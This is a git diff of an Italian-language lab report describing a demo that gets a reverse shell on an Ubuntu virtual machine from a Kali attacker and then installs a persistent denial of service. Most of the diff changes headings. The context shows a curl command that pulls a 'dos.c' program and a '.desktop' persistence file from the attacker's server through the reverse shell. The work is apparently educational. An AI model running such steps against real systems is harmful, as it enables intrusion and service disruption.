@@ -1,8 +1,9 @@
-# Cybersecurity report Huseinovic Elma
+## Huseinovic Elma
+## Cybersecurity report 
 
-## Reverse shell and Denial of service with persistence on an Ubuntu virtual machine
+# Reverse shell and Denial of service with persistence on an Ubuntu virtual machine
 
-# Introduction
+## Introduction
 
 L'obiettivo della demo è di creare un Denial of Service persistente su una macchina virtuale Ubuntu, che quindi sarà la macchina attaccata, mentre per l'attaccante è stata utilizzata una macchina virtuale Kali. Per fare ciò, per prima cosa viene creata una reverse shell per permettere alla macchina attaccante di agire liberamente sulla macchina Ubuntu. 
 
@@ -59,7 +60,7 @@ A questo punto, essendo la reverse shell eseguita in background, l'utente su Ubu
 
 ![Reverse Shell](images/reverseshell.png)
 
-# DoS e persistent crash 
+# DoS e persistence
 
 Utilizzando la reverse shell, ora, è facile scaricare il programma `dos.c` e il file `dos.desktop` dal web file server di Kali utilizzando sempre il comando `curl`:
 `curl -O "http://10.0.2.2/demo/dos.c"`
